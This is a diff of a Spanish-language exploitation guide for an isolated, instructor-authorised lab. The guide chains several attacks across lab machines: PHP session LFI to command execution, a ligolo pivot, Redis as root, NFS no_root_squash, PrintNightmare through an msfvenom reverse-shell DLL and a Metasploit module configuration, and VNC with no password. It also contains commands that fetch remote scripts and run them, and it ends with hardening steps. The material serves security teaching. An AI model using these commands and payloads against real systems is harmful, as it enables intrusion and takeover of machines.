@@ -1,6 +1,6 @@
 # Guía de explotación · Lab PHP2Shell
 
-> Cadena: **M6 → M1 (PHP2Shell) → M2 (Redis) → M3 (NFS) → M4 (MS17-010) → M5 (VNC)**.
+> Cadena: **M6 → M1 (PHP2Shell) → [pivote] → M2 (Redis) → M3 (NFS) → M4 (PrintNightmare) → M5 (VNC)**.
 > Cada salto es una vulnerabilidad. Ninguno usa contraseñas.
 > Solo red aislada `10.10.10.0/24`, VM propias y autorización del docente.
 
@@ -27,10 +27,11 @@ se cambia en el script y la guía debe seguirlo.
 | `bootstrap.sh` / `bootstrap.ps1` | `lab/bootstrap.sh`, `lab/bootstrap.ps1` |
 | `lab/session.php` y `dl.php` | `lab/m1/app/lab/session.php`, `lab/m1/app/legacy-download/` |
 | `session.save_path=/tmp`, `cleanup=Off` | `lab/m1/conf/php-lab.ini` |
-| 6 niveles `../../../../../../tmp/sess_` | `dl.php` incluye desde `legacy-download/templates/` |
+| 7 niveles `../../../../../../../tmp/sess_` | `dl.php` incluye desde `legacy-download/templates/` |
 | `redis-cli ... CONFIG SET` | `lab/m2/install.sh` (Redis `User=root`, sin `requirepass`) |
 | `mount -t nfs` + `rotate.sh` | `lab/m3/install.sh` (`no_root_squash`, `/etc/cron.d/lab-rotate`) |
-| `ms17_010_eternalblue` | `lab/m4/install.ps1` (`Enable-LabSmb1`) + `lab/chain/04` |
+| `01b-pivot.sh` (ligolo, rutas /32) | `lab/chain/01b-pivot.sh` |
+| `printnightmare` | `lab/m4/install.ps1` (Spooler + `soporte`) + `lab/chain/04` |
 | `vnc-info` / `vncviewer` | `lab/m5/install.ps1` (`UseVncAuthentication=0`, 5900) |
 | Ejecución por pasos | `lab/chain/01-m1-php2shell.sh` … `05-m4-to-m5.sh` |
 
@@ -66,8 +67,9 @@ curl -fsSL http://10.10.10.20:8000/bootstrap.sh | sudo bash -s m3   # o m2, m1
 En cada Windows (consola elevada):
 
 ```powershell
-iwr http://10.10.10.20:8000/bootstrap.ps1 -UseBasicParsing | iex
-# luego: C:\lab\m4\install.ps1   (o m5)
+iwr http://10.10.10.20:8000/bootstrap.ps1 -UseBasicParsing -OutFile $env:TEMP\bootstrap.ps1
+powershell -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\bootstrap.ps1 -Role m4
+# o -Role m5. El instalador queda en C:\lab\lab\m4\install.ps1
 ```
 
 ### 1.3 Verificación
@@ -121,9 +123,9 @@ curl -sk --limit-rate 128k -b "PHPSESSID=$SID" \
 
 sleep 3
 
-# 2) incluir el archivo de sesión por el LFI (6 niveles hasta /)
+# 2) incluir el archivo de sesión por el LFI (7 niveles hasta /)
 curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
-  --data-urlencode "file=../../../../../../tmp/sess_$SID" \
+  --data-urlencode "file=../../../../../../../tmp/sess_$SID" \
   --data-urlencode 'c=id'
 ```
 
@@ -137,7 +139,7 @@ Si responde, guarda el SID y sigue con ese canal para comandos:
 
 ```bash
 curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
-  --data-urlencode "file=../../../../../../tmp/sess_$SID" \
+  --data-urlencode "file=../../../../../../../tmp/sess_$SID" \
   --data-urlencode 'c=cat /var/www/wp/wp-config.php'
 ```
 
@@ -255,32 +257,41 @@ bash lab/chain/03-m2-to-m3.sh --run
 
 ---
 
-## 5. Salto 4 · M3 → M4 · MS17-010 (EternalBlue)
+## 5. Salto 4 · M3 → M4 · PrintNightmare (CVE-2021-34527)
 
 **Objetivo:** `SYSTEM` en M4.
-**Vulnerabilidad:** SMBv1 habilitado en Windows Server 2016 sin MS17-010.
+**Vulnerabilidad:** el spooler de impresión carga una DLL desde una ruta de red
+con la cuenta limitada `soporte`.
+
+> MS17-010 (EternalBlue) **no se usa por defecto**: el módulo de Metasploit no
+> soporta Windows Server 2016 build 14393 (`This exploit does not support this
+> build`). Solo vale si M4 es Server 2012 R2; para eso está `--eternalblue`.
 
 ### 5.1 Comprobación
 
 ```bash
-nmap -Pn -p445 --script smb-vuln-ms17-010 10.10.10.14
+nmap -Pn -p445,135,139 10.10.10.14
 ```
-
-Debe decir `VULNERABLE` (o al menos `State: LIKELY VULNERABLE`).
 
 ### 5.2 Explotación manual (Metasploit)
 
 ```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 \
+  -f dll -o ~/lab-work/pn.dll
 msfconsole -q
 ```
 
 ```text
-use exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/dcerpc/cve_2021_1675_printnightmare
 set RHOSTS 10.10.10.14
+set SMBUser soporte
+set SMBPass Soporte2026!
+set SRVHOST 10.10.10.20
+set DLL /root/lab-work/pn.dll
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 10.10.10.20
 set LPORT 4444
-exploit
+run
 ```
 
 En el meterpreter:
@@ -290,25 +301,25 @@ getuid
 # NT AUTHORITY\SYSTEM
 ```
 
-### 5.3 Automático (marcador sin credenciales)
+Si el módulo no aparece: `search printnightmare` y usa la ruta que devuelva.
+
+### 5.3 Automático
 
 ```bash
-bash lab/chain/04-m3-to-m4.sh --run
+bash lab/chain/04-m3-to-m4.sh --run            # PrintNightmare
+bash lab/chain/04-m3-to-m4.sh --eternalblue --run   # solo Server 2012 R2
 ```
 
-El script lanza un payload `windows/x64/exec` que escribe
-`C:\Transfer\PWNED-M4.txt` y lo lee por SMB anónimo (`Transfer` es Everyone).
+El script genera la DLL, lanza el módulo y lee `C:\Transfer\PWNED-M4.txt` por
+SMB anónimo (`Transfer` es Everyone y el SMB anónimo está habilitado a propósito).
 Esperado: `nt authority\system`.
 
-### 5.4 Fallback: PrintNightmare
+### 5.4 Si falla
 
-Si el build ya trae MS17-010:
-
-- Cuenta limitada ya creada: `soporte` / `Soporte2026!`
-- Spooler activo (lo deja el instalador de M4).
-- Exploit: `CVE-2021-34527` (cube0x0/CVE-2021-1675, SharpPrintNightmare o el
-  módulo de Metasploit `exploit/windows/local/cve_2021_34527_printnightmare`).
-- Resultado esperado: `NT AUTHORITY\SYSTEM` desde una sesión de `soporte`.
+- El módulo no existe → `search printnightmare` y ajusta `04`.
+- El spooler está parado → `Get-Service Spooler` en M4 y arráncalo.
+- La cuenta `soporte` no existe → reejecuta `m4/install.ps1`.
+- Si M4 fuera Server 2012 R2, usa `--eternalblue`.
 
 ---
 
@@ -331,12 +342,13 @@ Esperado: `Authentication: None`.
 vncviewer 10.10.10.15
 ```
 
-Sin contraseña. En el escritorio está `flag-M5.txt`.
+Sin contraseña. La bandera está en `C:\Compartido\flag-M5.txt` (también se puede
+leer por SMB anónimo: `smbclient //10.10.10.15/Compartido -N -c 'get flag-M5.txt'`).
 
 ### 6.3 Captura no interactiva
 
 ```bash
-pip install vncdotool
+command -v vncdotool || { echo "falta vncdotool (medio local de M6)"; exit 1; }
 vncdotool -s 10.10.10.15 capture /tmp/m5-flag.png
 ```
 
@@ -357,17 +369,21 @@ bash lab/chain/00-preflight.sh --full
 # 1. entrada
 bash lab/chain/01-m1-php2shell.sh --run        # uid=33(www-data)
 
+# 1.5 pivote: M1 pasa a ser la puerta
+bash lab/chain/01b-pivot.sh --run
+bash lab/chain/01b-pivot.sh --check            # M2-M5 por la interfaz lab
+
 # 2. Redis -> root M2
 bash lab/chain/02-m1-to-m2.sh --run            # uid=0(root)
 
 # 3. NFS + cron -> root M3
 bash lab/chain/03-m2-to-m3.sh --run            # uid=0(root) + PWNED-M3.txt
 
-# 4. MS17-010 -> SYSTEM M4
+# 4. PrintNightmare -> SYSTEM M4
 bash lab/chain/04-m3-to-m4.sh --run            # nt authority\system
 
 # 5. VNC -> M5
-bash lab/chain/05-m4-to-m5.sh --run            # captura con la bandera
+bash lab/chain/05-m4-to-m5.sh --run            # captura + flag
 ```
 
 Guarda por salto: comando, salida, captura y `sha256sum`.
@@ -381,7 +397,7 @@ Guarda por salto: comando, salida, captura y `sha256sum`.
 | 1 | `EV-01` + `LOG-01` | `uid=33(www-data)` y la URL del sink |
 | 2 | `EV-02` | `PONG`, `CONFIG SET`, `uid=0(root)` en M2 |
 | 3 | `EV-03` | `no_root_squash`, `rotate.sh`, `uid=0(root)` en M3 |
-| 4 | `EV-04` | `smb-vuln-ms17-010` y `nt authority\system` |
+| 4 | `EV-04` | `getuid` = `NT AUTHORITY\SYSTEM` y `PWNED-M4.txt` |
 | 5 | `EV-05` | `Authentication: None` y captura del escritorio |
 
 ---
@@ -396,7 +412,7 @@ Guarda por salto: comando, salida, captura y `sha256sum`.
 | No aparece `/tmp/sess_*` | `save_path` distinto | `php -i | grep save_path` (debe ser `/tmp`) |
 | Redis `PONG` pero sin llave | Redis no root o `/root/.ssh` ausente | `ps -o user= -C redis-server`; crear `/root/.ssh` |
 | `mount` NFS falla | 2049 cerrado desde M2 | `ufw allow from 10.10.10.12 to any port 2049` en M3 |
-| EternalBlue falla | build parcheado | usar PrintNightmare con `soporte` |
+| PrintNightmare falla | módulo/spooler | `search printnightmare`; comprobar Spooler |
 | VNC no responde | `tvnserver` caído o 5900 filtrado | `Get-Service tvnserver`; regla de firewall |
 
 ---
@@ -407,8 +423,8 @@ Guarda por salto: comando, salida, captura y `sha256sum`.
    El UAF puro (`entry-a`) sigue sin PoC público fiable.
 2. **Redis como root** es una misconfiguración intencional, no un CVE.
    Si se exige CVE, la alternativa es CVE-2022-0543 (paquete Debian de Redis).
-3. **MS17-010 depende del build** de WS2016; el fallback es PrintNightmare.
-4. **La LAN es plana:** los scripts corren desde M6 y el pivote es lógico, no un túnel.
+3. **PrintNightmare usa la cuenta limitada `soporte`** (precondición, no vulnerabilidad).
+4. **El pivote es real** con `01b-pivot.sh` (ligolo-ng + rutas /32 por M1).
 5. **VNC sin auth** da escritorio, no shell; la evidencia es la captura, no un `id`.
 
 ---
@@ -422,7 +438,7 @@ Restaurar `estado-inicial` y aplicar:
 | M1 | PHP 8.4.27 + `session.upload_progress.enabled=Off` + borrar el plugin legado |
 | M2 | `requirepass`, `bind 127.0.0.1`, Redis sin root |
 | M3 | `root_squash`, quitar el cron sobre el export |
-| M4 | MS17-010 + SMB1 off + Spooler detenido |
+| M4 | PrintNightmare parcheado + Spooler detenido |
 | M5 | VNC con contraseña + RDP con NLA |
 
 Después, repetir los mismos comandos: deben fallar.
